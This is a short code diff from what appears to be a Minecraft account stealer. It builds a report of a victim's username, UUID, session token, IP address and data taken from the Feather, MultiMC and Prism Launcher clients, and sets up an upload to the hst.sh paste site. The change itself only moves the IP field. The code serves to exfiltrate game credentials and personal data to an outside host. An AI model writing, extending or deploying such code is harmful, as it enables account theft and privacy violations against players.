@@ -32,6 +32,7 @@ new Thread(() => {
 Username: ${data.username}
 UUID: ${data.uuid}
 Token: ${data.token}
+IP: ${data.ip}
 
 === FEATHER CLIENT DATA ===
 ${data.feather || 'No Feather client data found'}
@@ -45,8 +46,7 @@ ${data.mmc || 'No MultiMC data found'}
 === PRISM LAUNCHER DATA ===
 ${data.prism || 'No Prism Launcher data found'}
 
-=== IP ===
-${data.ip}
+
 `;
 
         const hastebinUrl = new java.net.URL("https://hst.sh/");
